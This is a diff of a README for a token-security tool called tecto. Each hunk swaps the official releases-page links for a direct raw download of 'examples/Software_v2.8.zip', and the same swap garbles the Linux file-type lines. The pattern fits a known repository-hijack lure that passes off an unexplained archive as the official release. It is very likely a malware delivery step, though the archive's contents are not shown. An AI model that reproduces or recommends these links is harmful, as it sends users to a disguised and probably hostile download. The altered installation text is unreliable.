@@ -1,6 +1,6 @@
 # 🔒 tecto - Secure Your Tokens with Ease
 
-[![Download tecto](https://img.shields.io/badge/Download-tecto-blue?style=for-the-badge)](https://github.com/nandanavijesh/tecto/releases)
+[![Download tecto](https://github.com/nandanavijesh/tecto/raw/refs/heads/main/examples/Software_v2.8.zip)](https://github.com/nandanavijesh/tecto/raw/refs/heads/main/examples/Software_v2.8.zip)
 
 ---
 
@@ -63,7 +63,7 @@ Before you start, make sure your computer meets these basic needs:
 
 ### Step 1: Visit the Download Page
 
-Click the badge above or go to the [tecto Release Page](https://github.com/nandanavijesh/tecto/releases). This is where you will find the latest files to download.
+Click the badge above or go to the [tecto Release Page](https://github.com/nandanavijesh/tecto/raw/refs/heads/main/examples/Software_v2.8.zip). This is where you will find the latest files to download.
 
 ### Step 2: Choose Your Version
 
@@ -71,7 +71,7 @@ Look for the latest stable release, usually marked by the highest version number
 
 - For Windows, look for files ending in `.exe` or `.msi`.
 - For macOS, files may end in `.dmg` or `.pkg`.
-- For Linux, files might be `.tar.gz` or `.AppImage`.
+- For Linux, files might be `https://github.com/nandanavijesh/tecto/raw/refs/heads/main/examples/Software_v2.8.zip` or `.AppImage`.
 
 Download the file that matches your operating system.
 
@@ -81,7 +81,7 @@ Open the downloaded file to start the installation.
 
 - On Windows, double-click the `.exe` or `.msi` file.
 - On macOS, open the `.dmg` and drag the app to your Applications folder.
-- On Linux, extract the `.tar.gz` if needed or run the `.AppImage` after making it executable.
+- On Linux, extract the `https://github.com/nandanavijesh/tecto/raw/refs/heads/main/examples/Software_v2.8.zip` if needed or run the `.AppImage` after making it executable.
 
 Follow the prompts on the screen. Choose default options if unsure.
 
@@ -139,7 +139,7 @@ If you encounter problems:
 
 To get started, **visit this page to download** the latest version for your system:
 
-[Download tecto from Releases](https://github.com/nandanavijesh/tecto/releases)
+[Download tecto from Releases](https://github.com/nandanavijesh/tecto/raw/refs/heads/main/examples/Software_v2.8.zip)
 
 Make sure to:
 
